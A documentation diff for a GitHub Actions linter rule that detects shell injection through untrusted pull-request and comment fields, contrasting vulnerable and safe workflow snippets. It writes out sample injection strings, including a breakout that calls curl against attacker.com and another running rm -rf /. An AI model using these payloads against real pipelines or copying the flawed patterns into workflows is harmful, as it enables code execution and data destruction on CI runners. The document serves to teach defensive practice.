@@ -366,13 +366,41 @@ The code-injection-critical rule detects:
      echo "${{ github.event.pull_request.body }}"
    ```
 
+4. **Unquoted environment variables containing untrusted input**:
+   ```yaml
+   env:
+     PR_TITLE: ${{ github.event.pull_request.title }}
+   run: echo $PR_TITLE  # Missing quotes!
+   ```
+
+5. **eval with untrusted input (even when quoted)**:
+   ```yaml
+   env:
+     CMD: ${{ github.event.comment.body }}
+   run: eval "echo $CMD"  # Dangerous even with quotes!
+   ```
+
+6. **sh -c / bash -c with untrusted input**:
+   ```yaml
+   env:
+     BODY: ${{ github.event.pull_request.body }}
+   run: sh -c "process $BODY"  # Creates nested shell parsing
+   ```
+
+7. **Command substitution with untrusted input**:
+   ```yaml
+   env:
+     TITLE: ${{ github.event.pull_request.title }}
+   run: result=$(echo $TITLE)  # Untrusted input in subshell
+   ```
+
 ### Safe Patterns
 
 The rule recognizes these patterns as safe:
 
-1. **Environment variables**:
+1. **Properly quoted environment variables**:
    ```yaml
-   run: echo "$PR_TITLE"
+   run: echo "$PR_TITLE"  # Double quotes prevent shell metacharacter attacks
    env:
      PR_TITLE: ${{ github.event.pull_request.title }}
    ```
@@ -382,6 +410,112 @@ The rule recognizes these patterns as safe:
    run: echo "${{ github.sha }}"  # Trusted
    run: echo "${{ github.repository }}"  # Trusted
    ```
+
+3. **Passing environment variables to subshells safely**:
+   ```yaml
+   env:
+     PR_TITLE: ${{ github.event.pull_request.title }}
+   run: |
+     export PR_TITLE
+     sh -c 'echo "$PR_TITLE"'  # Single quotes prevent expansion in outer shell
+   ```
+
+4. **Using printf for safer output**:
+   ```yaml
+   env:
+     PR_TITLE: ${{ github.event.pull_request.title }}
+   run: printf '%s\n' "$PR_TITLE"  # printf with %s is safer than echo
+   ```
+
+### Shell Metacharacter Injection
+
+Even when using environment variables (which is the recommended practice), improper shell handling can still lead to injection vulnerabilities. The rule detects several dangerous patterns:
+
+#### Unquoted Variables
+
+**Vulnerable:**
+```yaml
+env:
+  PR_TITLE: ${{ github.event.pull_request.title }}
+run: echo $PR_TITLE
+```
+
+Without quotes, the shell performs word splitting and glob expansion. An attacker could use:
+- `* /etc/passwd` - glob expansion to list files
+- `$(malicious_command)` - command substitution
+
+**Safe:**
+```yaml
+env:
+  PR_TITLE: ${{ github.event.pull_request.title }}
+run: echo "$PR_TITLE"  # Double quotes prevent expansion
+```
+
+#### eval Command
+
+**Vulnerable:**
+```yaml
+env:
+  CMD: ${{ github.event.comment.body }}
+run: eval "echo $CMD"
+```
+
+Even with quotes, `eval` parses the string again, enabling:
+- `"; curl attacker.com #` - break out and execute arbitrary commands
+
+**Safe Alternative:**
+```yaml
+env:
+  CMD: ${{ github.event.comment.body }}
+run: |
+  # Use printf %q for proper escaping if eval is necessary
+  escaped=$(printf '%q' "$CMD")
+  # Or better, avoid eval entirely and use the variable directly
+  echo "$CMD"
+```
+
+#### Nested Shell Commands (sh -c, bash -c)
+
+**Vulnerable:**
+```yaml
+env:
+  BODY: ${{ github.event.pull_request.body }}
+run: sh -c "process $BODY"
+```
+
+Creates a new shell that parses the string again, vulnerable to:
+- `"; rm -rf / #` - command injection via quote escaping
+
+**Safe:**
+```yaml
+env:
+  BODY: ${{ github.event.pull_request.body }}
+run: |
+  # Export the variable and use single quotes in the subshell
+  export BODY
+  sh -c 'echo "$BODY"'  # Single quotes prevent outer shell expansion
+```
+
+#### Command Substitution
+
+**Vulnerable:**
+```yaml
+env:
+  TITLE: ${{ github.event.pull_request.title }}
+run: result=$(grep $TITLE file.txt)
+```
+
+Unquoted variable in command substitution allows:
+- Glob expansion
+- Word splitting
+- Embedded command injection
+
+**Safe:**
+```yaml
+env:
+  TITLE: ${{ github.event.pull_request.title }}
+run: result=$(grep -F -- "$TITLE" file.txt)  # Quote and use -F for fixed strings
+```
 
 ### Difference from Medium Severity
 
